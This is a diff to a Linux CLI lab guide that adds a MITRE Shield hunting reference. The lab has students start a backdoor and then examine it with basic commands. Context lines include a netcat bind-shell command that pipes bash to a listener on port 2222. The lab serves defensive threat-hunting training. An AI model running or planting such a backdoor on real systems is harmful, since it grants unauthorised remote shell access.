@@ -1,6 +1,15 @@
 
 # Linux CLI
 
+MITRE Shield
+------------
+
+Applicable MITRE Shield techniques:
+* [DTE0021](https://shield.mitre.org/techniques/DTE0021) - Hunting
+
+Instructions
+------------
+
 In this lab we will be looking at a backdoor through the lense of the the Linux CLI.
 
 We will be using a large number of different basic commands to get a better understanding of what the backdoor is and what it does.
@@ -41,7 +50,7 @@ Next, let's start the backdoor:
 
 /#`/bin/bash  0<backpipe | nc -l 2222 1>backpipe`
 
-In the above command we are creating a netcat listener that forwards all input through a backpipe and then into a bash session.  It then takes the output of the bash session and puts it back into the netcat listener. 
+In the above command we are creating a netcat listener that forwards all input through a backpipe and then into a bash session.  It then takes the output of the bash session and puts it back into the netcat listener.
 
 Basicly, this will create a backdoor listening on port 2222 of our linux system.
 
